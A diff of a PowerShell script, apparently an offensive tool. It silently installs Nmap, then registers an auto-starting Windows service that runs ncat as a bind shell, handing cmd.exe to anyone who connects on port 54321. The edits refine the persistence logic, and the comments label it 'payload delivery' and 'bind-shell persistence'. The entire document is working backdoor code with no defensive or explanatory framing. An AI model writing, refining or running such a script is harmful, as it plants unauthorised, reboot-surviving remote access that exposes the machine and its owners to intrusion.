@@ -1,4 +1,4 @@
-# Create temp directory if missing
+# Create temp directory for payload delivery
 if (!(Test-Path -Path "C:\temp")) {
     New-Item -Path "C:\temp" -ItemType Directory | Out-Null
 }
@@ -10,27 +10,32 @@ Invoke-WebRequest "https://nmap.org/dist/nmap-7.95-setup.exe" -OutFile $installe
 # Install Nmap silently
 Start-Process $installerPath -ArgumentList "/S" -Wait
 
-# Change to Nmap directory
-Set-Location "C:\Program Files (x86)\Nmap"
+# Path to Ncat
+$ncatPath = "C:\Program Files (x86)\Nmap\ncat.exe"
 
-# Start ncat immediately listener on port 54321
-& "C:\Program Files (x86)\Nmap\ncat.exe" -nv 0.0.0.0 54321 -e cmd.exe
+# Ensure Ncat exists, terminate if not
+if (!(Test-Path $ncatPath)) {
+    Write-Host "Ncat not found. Exiting."
+    exit
+}
 
-# Create Windows Service persistence
-$serviceName = "Ncat Reverse Shell"
-$serviceDisplay = "nc-reverse-shell"
+# Create persistent bind-shell service
+$serviceName = "NcatBindShell"
+$serviceDisplay = "Ncat Bind Shell Persistence"
+$port = 54321
 
-# Command to be run
-$serviceCmd = '& "C:\Program Files (x86)\Nmap\ncat.exe" -nv 0.0.0.0 54321 -e cmd.exe'
+# Command to run
+$serviceCmd = "powershell.exe -Command `"$ncatPath -nv 0.0.0.0 $port -e cmd.exe`""
 
 # Remove old service if present
 if (Get-Service -Name $serviceName -ErrorAction SilentlyContinue) {
+    sc.exe stop $serviceName | Out-Null
     sc.exe delete $serviceName | Out-Null
     Start-Sleep -Seconds 2
 }
 
 # Create new service
-sc.exe create $serviceName binPath= "$serviceCmd" start= auto DisplayName= "`"$serviceDisplay`""
+sc.exe create $serviceName binPath= "$serviceCmd" start= auto DisplayName= "\"$serviceDisplay\"" | Out-Null
 
-# Start service
+# Start the service
 Start-Service -Name $serviceName
